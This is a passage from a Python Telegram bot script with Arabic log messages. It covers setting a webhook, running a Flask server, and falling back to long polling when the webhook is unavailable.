        logger.warning("⚠️ SERVER_URL غير مضبوط، سيتم استخدام Polling.")
        return False
    webhook_full_url = f"{SERVER_URL}/webhook"
    try:
        bot.delete_webhook()
        time.sleep(1)
        success = bot.set_webhook(url=webhook_full_url)
        if success:
            logger.info(f"✅ Webhook تم تعيينه: {webhook_full_url}")
            return True
        else:
            logger.error("❌ فشل تعيين Webhook.")
            return False
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return False

# ===================== تشغيل التطبيق =====================
if __name__ == "__main__":
    if USE_WEBHOOK and SERVER_URL:
        logger.info("🔄 تشغيل البوت عبر Webhook...")
        webhook_ok = set_webhook()
        if webhook_ok:
            logger.info(f"✅ البوت يعمل عبر Webhook على المنفذ {PORT}")
            app.run(host='0.0.0.0', port=PORT, debug=False)
        else:
            logger.warning("⚠️ فشل تعيين Webhook، التحول إلى Polling...")
            logger.info("🔄 تشغيل البوت عبر Polling...")
            try:
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except KeyboardInterrupt:
                logger.info("⏹️ تم إيقاف البوت بواسطة المستخدم.")
            except Exception as e:
                logger.error(f"❌ خطأ في Polling: {e}")
    else:
        logger.info("🔄 تشغيل البوت عبر Polling...")
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except KeyboardInterrupt:
            logger.info("⏹️ تم إيقاف البوت بواسطة المستخدم.")
        except Exception as e:
            logger.error(f"❌ خطأ في Polling: {e}")
